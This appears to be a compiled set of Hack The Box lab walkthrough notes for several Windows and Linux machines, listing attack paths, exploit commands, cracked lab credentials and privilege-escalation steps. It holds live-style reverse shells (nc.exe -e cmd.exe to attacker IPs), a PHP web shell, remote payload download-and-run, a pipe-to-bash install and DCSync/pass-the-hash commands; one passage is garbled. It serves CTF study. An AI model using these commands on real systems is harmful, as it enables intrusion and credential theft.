- Crack the Administrator mail-account hash from hMailServer.ini and use the result for authenticated SMTP, not Windows login.
- Use CVE-2024-21413/Moniker Link: send mail from administrator@mailing.htb to the likely Maya mailbox with a UNC link to the attacker SMB listener.
- Capture and crack Maya's NetNTLM hash, then test the plaintext password over WinRM.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.

### Post-foothold local enumeration and lateral movement

- After landing as Maya, enumerate installed desktop applications and exact versions, not only services and privileges.
- Read C:\Program Files\LibreOffice\program\version.ini; LibreOffice 7.4.0.1 is the intended CVE-2023-2255 target.

### User path

**Memory chain:** group-membership abuse → path traversal → configuration-file secrets → password cracking → CVE-2024-21413 → SMB enumeration → web shell/RCE → WinRM

- try to read this file using the following URLencoded payload. ..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini The hMailServer.ini file reveals the password hash for the Administrator user.
- 841bb5acfa6779ae432fd7a4e6600ba7 We can use this website to successfully crack the password hash for the Administrator user on the hMailServer . homenetworkingadministrator Since the remote Windows server is running a mail server, it is also likely using a mail client to connect to it.
- Suppose a link directs to an SMB share, formatted as \\ <Malicious_IP>\file , in that case, the Windows Mail will automatically attempt to authenticate with the malicious remote server using the NTLM hash of the current user, which the remote server can then capture for malicious purposes.
- Thus, we can attempt to send the mail from administrator@mailing.htb to maya@mailing.htb .
- run the Python script with all the necessary flags as mentioned in the documentation of the PoC. $ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\YOUR_IP\smbFolder\test.txt" --subject Test CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.

#### Commands and PDF search strings

- `nmap -p- --min-rate=1000 -sV 10.10.11.14`
- `impacket-smbserver smbFolder $(pwd) -smb2support`
- `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
- `evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb`

### Artifacts and exact search anchors

`mailing.htb`, `/etc/hosts`, `C:\Program Files`, `hMailServer.ini`, `CVE-2024-21413`, `CVE-2024-21413.py`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\maya`, `C:\Users\maya\Desktop\user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Generate a malicious .odt with the CVE-2023-2255 PoC that executes the staged reverse shell.
- Place the document where the simulated privileged user will open it and keep the payload hosting server and listener active.
- The triggered LibreOffice process returns a shell as localadmin; verify context before reading the Administrator-level flag.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.

### Root / Administrator path

**Memory chain:** WinRM → CVE-2023-2255 → Git history/config → reverse shell

- A PoC for generating the malicious payload can be found here.
- Since our reverse shell payload relies on the netcat executable, we must upload the executable to the remote host. *Evil-WinRM* PS C:\programdata> upload nc.exe Info: Uploading nc.exe to C:\programdata\nc.exe Data: 60360 bytes of 60360 bytes copied Info: Upload successful!
- Upload the file to the target directory C:\Important Documents\ and wait for the system user to open the file. *Evil-WinRM* PS C:\> cd "C:\Important Documents" *Evil-WinRM* PS C:\important documents> upload exploit.odt Info: Uploading exploit.odt to C:\important documents\exploit.odt Data: 40732 bytes of 40732 bytes copied Info: Upload successful!
- After about a minute, we receive a reverse shell as user localadmin on our listener. $ nc -nvlp 1337 listening on [any] 1337 ... connect to [10.10.14.14] from (UNKNOWN) [10.129.231.40] 50405 Microsoft Windows [Version 10.0.19045.4355] (c) Microsoft Corporation.
- C:\Program Files\LibreOffice\program> whoami mailing\localadmin The root flag can be obtained at C:\Users\localadmin\Desktop\root.txt . type C:\Users\localadmin\Desktop\root.txt

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`C:\Program Files\LibreOffice\program\version.ini file`, `version.ini`, `C:\program files\libreoffice\program\version.ini`, `CVE-2023-2255`, `CVE-2023-2255.py`, `C:\ProgramData\nc.exe -e cmd.exe`, `C:\programdata`, `C:\programdata\nc.exe`, `C:\Important Documents`, `C:\Important Documents\ and wait for the system user to`, `C:\important documents\exploit.odt`, `C:\Program Files\LibreOffice\program`, `C:\Users\localadmin\Desktop\root.txt`

Open the PDF around page **8** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 53- Intentions

**Target:** Linux · Hard

[Detailed notes](./htb-writeups/Intentions.md) · [Official PDF](./htb-writeups/Intentions.pdf)

### Machine path overview

Intentions is a hard Linux machine that starts off with an image gallery website which is prone to a second-order SQL injection leading to the discovery of BCrypt hashes. Further enumeration reveals a v2 API endpoint that allows authentication via hashes instead of passwords, leading to admin access to the site. Within the admin panel the attacker will find a page that allows them to edit the images within the gallery with the help of Imagick . The attacker is able to exploit the Imagick object instantiation and gain code execution. Once the attacker has a shell as www-data they will need to examine the Git history for the current project, where they will find credentials for the user greg . Once logged in as greg the user will enumerate and find that they have access to the /opt/scanner/scanner binary with extended capabilities, specifically CAP_DAC_READ_SEARCH . This capability allows the attacker to exfiltrate sensitive files such as the private SSH key of the root user, byte-by-byte. With the key the attacker is able to authenticate through SSH as the root user.

### Remote enumeration and foothold checks

- Treat the gallery filtering workflow as second-order SQL injection: input is stored first and becomes injectable when a later operation consumes it.
- Extract BCrypt hashes, then enumerate the v2 API because it accepts a hash as an authentication secret; use that behavior to reach the admin panel without cracking first.
- The admin image editor invokes ImageMagick; exploit object instantiation/format handling to write or execute a PHP payload in web-accessible storage.
- A basic sqlmap run against updateGenresRequest and even an initial --second-req run return no injection because the application strips spaces. Save the update-genres request and feed request separately, use --second-req=fetchFeedRequest with --tamper=space2comment, and if only time-based behavior appears add --dbms=MySQL --level=5.
- The Imagick foothold requires a multipart MSL upload with path=vid:msl:/tmp/php*, an arbitrary required effect value, and file=@payload.msl so Imagick processes the unknown PHP temporary filename and writes rce.php into public storage. A 502 or empty response can still be success, so verify /storage/rce.php rather than abandoning the exploit.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.

### Post-foothold local enumeration and lateral movement

- From www-data, inspect the application root itself; /var/www/html/intentions contains .git even when generic enumeration appears empty.
- If Git refuses the root-owned repository as dubious and www-data cannot write its normal config, set HOME=/tmp, add the repository as a safe.directory, then run git log -p.
- Recover Greg's credential from an older commit and SSH as Greg; note that Greg belongs to the scanner group.
- Inspect /opt/scanner/scanner, its wrapper/use in dmca_check.sh, and file capabilities with getcap rather than checking SUID/sudo only.

### User path

**Memory chain:** SSH → directory/file discovery → SQL injection → database enumeration → password cracking → pass-the-hash → web shell/RCE → RFI → reverse shell → Git history/config

- can verify this by performing the same request against the v1 endpoint: curl -X POST http://intentions.htb/api/v1/auth/login {"status":"error","errors":{"email":["The email field is required."],"password": ["The password field is required."]}} During the SQL injection step, we recovered the uncrackable password hashes of two administrator users.
- can test our theory by trying to authenticate as one of the administrators using their hash: curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoT tjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login {"status":"success","name":"steve"} Indeed, it seems that we can authenticate using hashes over v2 .
- When we intercept the request in our proxy, we change the URL to /api/v2... and the password parameter to hash .
- already know about the password/hash change but we also get a reference link to imagick , which is allegedly used to apply effects on the images.
- If we try to rectify this through the suggested command , we get a permission error: git config --global --add safe.directory /var/www/html/intentions error: could not lock config file /var/www/.gitconfig: Permission denied We will find that our lack of write access in /var/www causes us some issues.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.83.115`
- `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u`
- `sqlmap -r updateGenresRequest --batch`
- `sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch`
- `sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch -tamper=space2comment`
- `sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch -tamper=space2comment --tables`
- `sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch -tamper=space2comment -T users --dump`
- `curl -X POST http://intentions.htb/api/v2/auth/login`
- `curl -X POST http://intentions.htb/api/v1/auth/login`
- `curl -d`
- `curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'User-Agent:`
- `curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN:`
- `sudo python3 -m http.server 80`
- `ssh greg@intentions.htb`

### Artifacts and exact search anchors

`/etc/hosts`, `intentions.htb`, `/usr/share/seclists/Discovery/Web-Content/big.txt`, `/var/www/html/intentions/storage/app/public/animals/jevgeni-fil-rz2Nh0U8vwsunsplash.jpg`, `/var/www/html/intentions/storage/app/public/animals/jevgeni-filrz2Nh0U8vws-unsplash.jpg`, `/etc/passwd`, `/var/www/html/intentions/storage/app/public/rce.php`, `rce.php`, `/tmp/php*`, `/var/www/html/intentions$`, `/var/www/html/intentions`, `/var/www/.gitconfig`, `/var/www`, `Helper.php`, `/home/greg/user.txt`

Open the PDF around page **14** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- /opt/scanner/scanner has cap_dac_read_search, so it can read files Greg cannot access even though it is neither SUID nor sudo-enabled.
- Abuse the scanner's length/hash comparison as a byte-by-byte oracle: generate candidate MD5 blacklist entries and increase the tested length after each match.
- Reconstruct /root/.ssh/id_rsa, apply restrictive permissions, and SSH directly as root.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Enumerate Linux file capabilities with `getcap -r /`; map each capability to file-read, UID-change, or network abuse.

### Root / Administrator path

**Memory chain:** SUID abuse → Linux capabilities → SSH → private-key discovery

- File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.
- Please avoid using extUnfortunately a strong password was used, and we are unable to achieve a full root shell, but were still able to leak the flag.ra colons in the label as that is not currently supported.
- Only compatible with -c -s string Specific hash to check against.
- To evaluate for matches, the binary is generating an MD5 hash for the contents of the file and compares it against a user-provided blacklist.
- The program also allows us to check a specific file with the -c flag, or an entire directory with the -d flag.

#### Commands and PDF search strings

- `SSH key:`
- `ssh -i root root@intentions.htb`

### Artifacts and exact search anchors

`dmca_check.sh`, `/opt/scanner/scanner`, `/home/legal/uploads`, `/home/greg/dmca_hashes.test`, `/home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg`, `/home/legal/uploads/`, `/root/.ssh/id_rsa`, `extract.py`, `intentions.htb`, `/root/root.txt`

Open the PDF around page **18** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 54- Flight

**Target:** Windows / Active Directory · Hard

[Detailed notes](./htb-writeups/Flight.md) · [Official PDF](./htb-writeups/Flight.pdf)

### Machine path overview

Flight is a hard Windows machine that starts with a website with two different virtual hosts. One of them is vulnerable to LFI and allows an attacker to retrieve an NTLM hash. Once cracked, the obtained clear text password will be sprayed across a list of valid usernames to discover a password re-use scenario. Once the attacker has SMB access as the user s.moon he is able to write to a share that gets accessed by other users. Certain files can be used to steal the NTLMv2 hash of the users that access the share. Once the second hash is cracked the attacker will be able to write a reverse shell in a share that hosts the web files and gain a shell on the box as low privileged user. Having credentials for the user c.bum , it will be possible to gain a shell as this user, which will allow the attacker to write an aspx web shell on a web site that's configured to listen only on localhost. Once the attacker has command execution as the Microsoft Virtual Account he is able to run Rubeus to get a ticket for the machine account that can be used to perform a DCSync attack ultimately obtaining the hashes for the Administrator user.

### Remote enumeration and foothold checks

- Fuzz the Host header on flight.htb and filter the baseline response size; school.flight.htb is the hidden vhost.
- Bypass the LFI filter on the school vhost, then request a UNC path so the Apache service account authenticates to Responder.
- Crack svc_apache's NetNTLM hash, use the credential for lookupsid user enumeration, and spray that same password across the discovered usernames.
- S.Moon has write access to an otherwise empty Shared share; empty does not mean useless—use ntlm_theft browse-trigger files.
- Only .ini lure files are accepted in Shared; upload the browse-trigger variant, capture C.Bum's hash, crack it, and re-enumerate shares.
- C.Bum can write to the Web share, so place a server-side payload in the exposed Apache web root for the first host shell.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Check each SMB share for both read and write access. A writable share may enable file-placement, hash capture, service/task abuse, or an application-triggered payload.
- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.

### Post-foothold local enumeration and lateral movement

- The initial web shell runs as svc_apache; use RunasCs with C.Bum's credential to regain the stronger user context.
- Enumerate local listening sockets with Get-NetTCPConnection -State Listen and inspect C:\inetpub; port 8000 is an internal-only IIS site.
- Tunnel/SOCKS to http://127.0.0.1:8000 and correlate the page with C:\inetpub\development.
- C.Bum's WebDevs membership permits writing an ASPX shell into the internal IIS root; trigger it through the tunnel to obtain IIS APPPOOL\DefaultAppPool.

### User path

**Memory chain:** directory/file discovery → virtual-host enumeration → subdomain enumeration → group-membership abuse → LFI/local file read → NTLM relay/coercion → password cracking → SMB enumeration → password spraying

- can use john to crack it. john hash --wordlist=/usr/share/wordlists/rockyou.txt We have a clear text password for the user svc_apache .
- Foothold Now that we have a valid set of credentials, let's continue our enumeration by checking if the user svc_apache is able to access any shares on SMB. smbmap -H flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' Unfortunately, the user svc_apache has no access to write on any share.
- Since the account svc_apache was created to run the Apache service it totally plausible that the user who created this service account has re-used his personal password.
- Judging from the name of the share it is totally possible that many users access this share.
- try to crack the hash of the user c.bum using john once again. john --wordlist=/usr/share/wordlists/rockyou.txt hash The hash cracked successfully to Tikkycoll_431012284 .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.42.88`
- `ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" -w`
- `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
- `smbmap -H flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'`
- `impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'`
- `crackmapexec smb flight.htb -u ./users -p 'S@Ss!K@*t13'`
- `smbmap -H flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'`
- `impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb`
- `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
- `smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284'`

### Artifacts and exact search anchors

`flight.htb`, `/etc/hosts`, `FUZZ.flight.htb`, `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`, `school.flight.htb`, `index.php`, `C:\Windows\System32\drivers\etc\hosts file by specifying this path in the view parameter`, `/usr/share/wordlists/rockyou.txt`, `ntlm_theft.py`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Remember that an IIS virtual account uses the computer account for network authentication.
- Run Rubeus tgtdeleg in the app-pool context to obtain the machine-account ticket, then convert the kirbi/Base64 ticket to ccache.
- Use the machine ticket for DCSync and retrieve the Administrator hash.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
- Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.

### Root / Administrator path

**Memory chain:** web shell/RCE → saved-credential abuse → DCSync/secrets dump → Kerberos ticket abuse → WMI/PowerShell remoting → SeImpersonate/token abuse

- upload a very simple PHP shell so that we can finally get code execution on the machine. <?php echo system($_GET['c']); ?> Note: The shells are deleted periodically from the web server so if you get a Not Found error, reupload the shell file.
- First, we exit our shell and then we create a SOCKS tunnel. socks5 start Now that we have established a SOCKS tunnel, we can try to access the internal IIS server.
- Since, the user c.bum is a member of a group called WebDevs it's plausible that we have write access to the C:\inetpub\development folder.
- Finally, we can use the hashes that we extracted to authenticate as the Administrator user using impacket-psexec . impacket-psexec Administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c The root flag can be found in C:\Users\Administrator\Desktop\root.txt .
- Essentialy what you are trying to achieve is to force the machine to authenticate as NT AUTHORITY\SYSTEM to a process you control and then, because you have the SeImpersonatePrivilege , create a new process that runs as NT AUTHORITY\SYSTEM .

#### Commands and PDF search strings

- `curl 'http://flight.htb/shell.php?c=whoami'`
- `curl https://sliver.sh/install|sudo bash`
- `sudo python3 -m http.server 80`
- `curl 'http://flight.htb/shell.php?c=powershell%20c%20%22wget%2010.10.14.67%2Fhtb.exe%20-usebasicparsing%20outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5C`
- `sudo ntpdate -u flight.htb`
- `impacket-psexec .`
- `impacket-psexec Administrator@flight.htb -hashes`

### Artifacts and exact search anchors

`flight.htb`, `school.flight.htb`, `shell.php`, `sliver.sh`, `C:\users\public\music\htb.exe`, `/opt/RunasCs.exe`, `C:\inetpub directory`, `C:\inetpub and comparing them to the web site that we accessed`, `C:\inetpub\development is the directory that gets hosted. Since`, `C:\inetpub\development folder. Our goal is`, `shell.aspx`, `g0.flight.htb`, `C:\Users\Administrator\Desktop\root.txt`, `C:\users\public\music`, `/opt/SweetPotato.exe`

Open the PDF around page **13** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 55- Blackfield

**Target:** Windows / Active Directory · Hard

[Detailed notes](./htb-writeups/Blackfield.md) · [Official PDF](./htb-writeups/Blackfield.pdf)

### Machine path overview

Backﬁeld is a hard diﬃculty Windows machine featuring Windows and Active Directory misconﬁgurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an oﬄine brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.

### Remote enumeration and foothold checks

- Test both anonymous and guest SMB. The profiles$ share is readable and its directory names form the domain username list even though forensic is initially denied.
- Run GetNPUsers against the harvested usernames; crack support's AS-REP hash.
- Collect BloodHound as support and inspect ACL edges: support can force-change audit2020's password.
- After resetting audit2020, re-enumerate SMB; forensic now contains a zipped LSASS memory dump.
- Parse lsass.DMP with pypykatz, check the LDAP lockoutThreshold before spraying extracted usernames/hashes, and find svc_backup's working hash.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Try RPC enumeration with null, guest, and recovered credentials (`enumdomusers`, `querydispinfo`, groups, password policy). RPC may work when SMB file browsing looks empty.
- Enumerate scheduled jobs/tasks plus every referenced script, binary, working directory, and PATH component. Writable dependencies matter even when the task itself is protected.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
- With SeBackup, use backup semantics (for example DiskShadow/robocopy or BackupOperator tooling) to copy SAM/SYSTEM or NTDS/SYSTEM, then extract hashes offline.

### Post-foothold local enumeration and lateral movement

- Use Evil-WinRM with svc_backup's NT hash and verify SeBackupPrivilege/SeRestorePrivilege with whoami /priv.
- Robocopy with backup semantics can read otherwise denied files, but the intended domain compromise requires NTDS rather than stopping at an Administrator desktop note.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → AS-REP roasting → password cracking → BloodHound path analysis → process-memory credential recovery → Kerberos ticket abuse → DPAPI/browser secrets → saved-credential abuse → cron/scheduled-job abuse

- Foothold Attempting anonymous and guest enumeration of SMB shares reveals a non-default share named profiles$ .
- There is also another non-default share called forensic that we don't have access to. smbmap -u guest -H 10.10.10.192 Inspecting the profiles$ share reveals a list of user proﬁle or document folders.
- Click Raw Query at the bottom, and type in the following Cypher query: MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p Our support user has the password change permission on the audit2020 user.
- This allows the user to access network resources without re-typing their credentials for each service.
- LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.

#### Commands and PDF search strings

- `nmap -sC -sV -p$ports 10.10.10.192`
- `smbmap -u guest -H 10.10.10.192`
- `GetNpUsers.py in order to see if any user has Kerberos pre-authentication disabled.`
- `GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip`
- `john hash --format=krb5asrep`
- `bloodhound-python command below.`
- `bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns`
- `rpcclient -U blackfield/support 10.10.10.192`
- `rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#`
- `cme smb 10.10.10.192 -u audit2020 -p 'H@CKTHEB0X#' --shares`
- `ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -p 389 -h 10.10.10.192 b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold`
- `cme smb 10.10.10.192 -u users -H hashes`
- `evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`

### Artifacts and exact search anchors

`GetNpUsers.py`, `/usr/share/neo4j/logs`, `/usr/share/neo4j/logs/neo4j.log`, `smbclient.py`, `lsass.zip`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Create an authenticated attacker SMB share, map it from the target, and use wbadmin to back up the NTDS volume to that share.
- Restore/extract NTDS.dit plus the SYSTEM hive from the backup and run secretsdump offline.
- Pass the recovered Administrator NT hash for the final shell.
- Use wmiexec with the recovered Administrator NT hash for the final shell: psexec changes the context to NT AUTHORITY\SYSTEM, which cannot decrypt the Administrator's EFS-protected root.txt even though the hash recovery itself succeeded.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- With SeBackup, use backup semantics (for example DiskShadow/robocopy or BackupOperator tooling) to copy SAM/SYSTEM or NTDS/SYSTEM, then extract hashes offline.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** SeBackup abuse → SeRestore abuse → pass-the-hash → SMB enumeration → DCSync/secrets dump → registry secrets → WMI/PowerShell remoting → WinRM

- can abuse the SeBackup privilege in order to retrieve ﬁles from the Administrator Desktop using robocopy.
- Using robocopy, we are able to retrieve a notes.txt but are denied access on root.txt. robocopy /b C:\Users\Administrator\Desktop\ C:\ By reading the notes.txt ﬁle, we understand the root.txt ﬂag is encrypted (probably with EFS), which is blocking our access with robocopy.
- Dumping Hashes with WBAdmin So we need to get into the Administrator context.
- On way to do this is to abuse SeBackup and SeRestore privileges in order to dump the AD database.
- Then, we can use the administrator NTLM hash in a PtH (Pass the Hash) attack to get a shell as them.

#### Commands and PDF search strings

- `secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`
- `secretsdump.py -ntds ntds -system system LOCAL`
- `secretsdump.py -security security -sam sam -system system LOCAL`

### Artifacts and exact search anchors

`C:\Users\Administrator\Desktop\ C`, `/etc/samba/smb.conf`, `smb.conf`, `t:\\10.10.14.3\smb include`, `c:\windows\ntds`, `c:\windows\ntds\ntds.dit -recoverytarget`, `C:\ -notrestoreacl`, `C:\system.hive`, `Impacketsecretsdump.py`, `secretsdump.py`, `wmiexec.py`, `C:\windows\temp\ folder`, `SeBackupPrivilegeUtils.dll`, `SeBackupPrivilegeCmdLets.dll`, `h:\windows\ntds\ntds.dit c`, `h:\windows\system32\config\SYSTEM`, `c:\windows\temp\SYSTEM -Overwrite`, `h:\windows\system32\config\SECURITY`, `c:\windows\temp\SECURITY -Overwrite`, `h:\windows\system32\config\SAM c`

Open the PDF around page **10** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 56- EscapeTwo

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/EscapeTwo.md) · [Official PDF](./htb-writeups/EscapeTwo.pdf)

### Machine path overview

EscapeTwo is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to MSSQL , granting us initial access. System enumeration reveals SQL credentials, which are sprayed to obtain WinRM access. Further domain analysis shows the user has write owner rights over an account managing ADCS . This is used to enumerate ADCS , revealing a misconfiguration in Active Directory Certificate Services . Exploiting this misconfiguration allows us to retrieve the Administrator account hash, ultimately leading to complete domain compromise.

### Remote enumeration and foothold checks

- Use the supplied Rose credential to enumerate SMB and download accounts.xlsx from Accounting Department.
- Do not discard the corrupted spreadsheet: file identifies a ZIP container and the first bytes are 50 48 04 03 instead of the correct XLSX/ZIP magic 50 4B 03 04; repair them and extract the embedded credentials.
- Spray the spreadsheet username/password pairs, then remember that the useful sa credential is a SQL-local login and requires --local-auth.
- Connect with mssqlclient, enable xp_cmdshell, and obtain command execution as sql_svc.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
- Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- Enumerate MSSQL/service and local configuration for the reused SQL service password, build the domain user list, and spray it.
- The reused password belongs to Ryan and permits WinRM; collect BloodHound immediately after landing as Ryan.

### User path

**Memory chain:** LDAP enumeration → subdomain enumeration → SMB enumeration → database enumeration → reverse shell → configuration-file secrets → GPP cpassword recovery → password spraying → WinRM → BloodHound path analysis

- Since we saw that MSSQL port was open from the Nmap scan, we can test these credentials on MSSQL by passing the localauth option, which attempts to authenticate directly against the MSSQL service.
- C:\SQL2019\ExpressAdv_ENU>type sql-Configuration.INI <...snip...> SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS" SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3" SQLSYSADMINACCOUNTS="SEQUEL\Administrator" SECURITYMODE="SQL" SAPWD="MSSQLP@ssw0rd!" ADDCURRENTUSERASSQLADMIN="False" TCPENABLED="1" NPENABLED="1" BROWSERSVCSTARTUPTYPE="Automatic" IAcceptSQLServerLicenseTerms=True C:\SQL2019\ExpressAdv_ENU> We then proceed to enumerate users on the system using net user , which displays the user accounts present on the system.
- C:\SQL2019\ExpressAdv_ENU>net user net user User accounts for \\DC01 ------------------------------------------------------------------------------Administrator ca_svc Guest krbtgt michael oscar rose ryan sql_svc The command completed successfully.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.51`
- `Nmap done: 1 IP address (1 host up) scanned in 124.27 second`
- `netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares`
- `impacket-smbclient sequel.htb/rose:'KxEPkKe6R8su'@10.10.11.51`
- `netexec smb 10.10.11.51 -u users.txt -p pass.txt`
- `nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth`
- `impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51`
- `EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.9 4455';`
- `netexec smb sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'`
